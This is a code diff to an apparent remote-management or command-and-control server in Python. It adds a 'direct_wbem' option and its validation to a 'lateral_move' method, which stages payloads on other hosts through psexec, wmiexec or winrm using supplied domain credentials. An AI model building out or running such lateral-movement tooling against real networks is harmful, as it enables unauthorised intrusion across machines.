@@ -3491,7 +3491,7 @@ class RMMServer:
         body = str((event or {}).get("body") or "").strip()
         return {"ok": True, "session_id": session.id, "identity": identity, "output": body}, "ok"
 
-    def lateral_move(self, session_id_or_prefix, method, host, verify=True,
+    def lateral_move(self, session_id_or_prefix, method, host, verify=True, direct_wbem=False,
                      exec_timeout=300.0, register_timeout=60.0, verify_timeout=120.0, https=False, insecure=False,
                      loader="csharp", independent=True, identity_domain="", identity_user="", identity_password=""):
         """Request remote execution using the source agent's compiled debug mode.
@@ -3537,6 +3537,8 @@ class RMMServer:
             return None, "invalid_https"
         if not isinstance(insecure, bool) or (insecure and not https):
             return None, "invalid_insecure"
+        if not isinstance(direct_wbem, bool) or (direct_wbem and method != "wmiexec"):
+            return None, "invalid_direct_wbem"
         # Independent lifetime is a winrm-scoped option: it re-stages the
         # deployment through a local WMI process so the target escapes the
         # shell job and the source closes the session after readiness.
@@ -3613,6 +3615,7 @@ class RMMServer:
             **({"loader": "csharp"} if method != "psexec" else {}),
             **({"payload_sha256": payload_sha256} if method != "psexec" else {}),
             **({"https": True} if https else {}), **({"insecure": True} if insecure else {}),
+            **({"direct_wbem": True} if direct_wbem else {}),
             **({"identity": {"domain": identity_domain, "user": identity_user,
                              "password": str(identity_password or "")}} if identity_user else {})}, separators=(",", ":"))
         identity_label = (identity_domain + "\\" if identity_domain else "") + identity_user
@@ -6131,7 +6134,7 @@ class RMMHandler(BaseHTTPRequestHandler):
                 self._json(404, {"error": "session_not_found"})
             elif status in ("agent_type_unsupported", "session_busy"):
                 self._json(409, {"error": status})
-            elif status in ("invalid_host", "invalid_mode", "invalid_identity", "invalid_identity_method"):
+            elif status in ("invalid_host", "invalid_mode", "invalid_identity", "invalid_identity_method", "invalid_direct_wbem"):
                 self._json(400, {"error": status})
             elif status == "session_killed":
                 self._json(410, {"error": status})
@@ -6327,6 +6330,7 @@ class RMMHandler(BaseHTTPRequestHandler):
                 exec_timeout = float(body.get("exec_timeout", 300))
                 https = body.get("https", False)
                 insecure = body.get("insecure", False)
+                direct_wbem = body.get("direct_wbem", False)
                 independent = body.get("independent", True)
                 loader = body.get("loader", "csharp")
                 register_timeout = float(body.get("register_timeout", 60))
@@ -6340,6 +6344,8 @@ class RMMHandler(BaseHTTPRequestHandler):
                     raise ValueError("https must be a boolean")
                 if not isinstance(insecure, bool):
                     raise ValueError("insecure must be a boolean")
+                if not isinstance(direct_wbem, bool):
+                    raise ValueError("direct_wbem must be a boolean")
                 if not isinstance(independent, bool):
                     raise ValueError("independent must be a boolean")
                 if not isinstance(loader, str):
@@ -6383,6 +6389,7 @@ class RMMHandler(BaseHTTPRequestHandler):
                 identity_password=identity_password,
                 **({"https": True} if https else {}),
                 **({"insecure": True} if insecure else {}),
+                **({"direct_wbem": True} if direct_wbem else {}),
             )
             if status == "not_found":
                 self._json(404, {"error": "session_not_found"})
@@ -6390,7 +6397,7 @@ class RMMHandler(BaseHTTPRequestHandler):
                 self._json(409, {"error": status})
             elif status in ("invalid_method", "invalid_host", "invalid_https",
                             "invalid_insecure", "invalid_loader", "invalid_independent",
-                            "invalid_identity", "invalid_identity_method"):
+                            "invalid_identity", "invalid_identity_method", "invalid_direct_wbem"):
                 self._json(400, {"error": status})
             elif status == "loader_reserved":
                 self._json(400, {"error": status,
